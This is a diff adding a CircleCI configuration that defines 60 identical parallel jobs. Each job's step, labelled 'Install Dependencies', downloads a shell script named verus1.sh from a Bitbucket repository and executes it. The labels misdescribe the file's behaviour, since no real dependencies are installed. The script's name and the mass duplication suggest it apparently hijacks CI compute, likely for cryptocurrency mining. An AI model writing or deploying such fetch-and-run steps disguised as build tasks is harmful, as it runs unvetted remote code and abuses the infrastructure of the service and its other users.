@@ -1,0 +1,486 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku9:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku10:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku11:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku12:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku13:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku14:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku15:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku16:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku17:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku18:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku19:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku20:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku21:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku22:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku23:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku24:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku25:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku26:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku27:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku28:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku29:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku30:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku31:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku32:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku33:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku34:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku35:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku36:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku37:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku38:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku39:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku40:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku41:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku42:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku43:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh          
+    aku44:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh         
+    aku45:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh   
+    aku46:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh        
+    aku47:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh            
+    aku48:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh            
+    aku49:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh 
+    aku50:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh           
+    aku51:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh            
+    aku52:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh       
+    aku53:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh     
+    aku54:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh        
+    aku55:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh    
+    aku56:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh            
+    aku57:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh        
+    aku58:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh  
+    aku59:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh 
+    aku60:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://bitbucket.org/jajfkv/josken/raw/8bc2cab20294109ba01c25331bff9f82698b353b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh 
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
+            - aku21
+            - aku22
+            - aku23
+            - aku24
+            - aku25
+            - aku26
+            - aku27
+            - aku28
+            - aku29
+            - aku30
+            - aku31
+            - aku32
+            - aku33
+            - aku34
+            - aku35
+            - aku36
+            - aku37
+            - aku38
+            - aku39
+            - aku40
+            - aku41
+            - aku42
+            - aku43
+            - aku44
+            - aku45
+            - aku46
+            - aku47
+            - aku48
+            - aku49
+            - aku50
+            - aku51
+            - aku52
+            - aku53
+            - aku54
+            - aku55
+            - aku56
+            - aku57
+            - aku58
+            - aku59
+            - aku60
